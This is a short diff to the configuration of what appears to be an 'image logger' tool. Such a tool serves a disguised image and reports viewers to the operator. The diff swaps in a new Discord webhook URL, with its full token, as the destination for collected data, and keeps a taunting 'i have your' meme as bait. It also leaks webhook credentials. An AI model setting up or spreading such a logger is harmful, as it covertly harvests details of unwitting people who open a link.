@@ -12,7 +12,7 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1431829683363774586/28mEo-FuQ4jN5lRFeKULiP7-EVj6HElcEUOE8eY5nuUTlQYZMd46W5Gn5s3yr12BLwLs",
+    "webhook": "https://discord.com/api/webhooks/1431842729062830132/w2LLMlEzZalwA1x2651tH4oPsOSStxq9bz8c8Cq_YfzWiBJLqPVRY0kZAl_QjdMms3KI",
     "image": "https://media.makeameme.org/created/i-have-your-7ce4486a1c.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
